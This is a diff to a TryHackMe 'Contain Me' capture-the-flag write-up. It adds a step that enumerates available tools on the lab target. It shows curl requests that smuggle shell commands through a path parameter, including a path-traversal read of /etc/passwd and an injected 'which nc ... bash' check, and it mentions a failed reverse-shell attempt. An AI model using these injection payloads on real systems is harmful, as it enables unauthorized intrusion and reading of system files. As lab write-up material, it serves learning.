@@ -1,5 +1,5 @@
 ---
-{"dg-publish":true,"permalink":"/try-hack-me-rooms/contain-me/","created":"2026-04-02T15:14:28.705+02:00","updated":"2026-04-02T22:48:38.821+02:00","dg-note-properties":{}}
+{"dg-publish":true,"permalink":"/try-hack-me-rooms/contain-me/","created":"2026-04-02T15:14:28.705+02:00","updated":"2026-04-02T23:01:07.300+02:00","dg-note-properties":{}}
 ---
 
 ![](/img/user/Attachments/redteaming2.png)
@@ -188,6 +188,18 @@ curl "http://10.112.132.114/index.php?path=../../../../etc/passwd;cat%20%2Fetc%2
 
 So far it seems that the only payload which works is the payload to read /etc/passwd. 
 
+Checking which tools are available
+
+Running this command: `which nc netcat ncat python3 python perl bash`
+
+URL-encoding it first to complete the payload
+```
+curl "http://10.112.132.114/index.php?path=/etc/passwd;which%20nc%20netcat%20ncat%20python3%20python%20perl%20bash"
+```
+
+![](/img/user/Attachments/available-tools.png)
+
+So **python perl and bash** are available which explains why spawning a reverse shell with nc was unsuccessful. 
 
 **info.php**
 
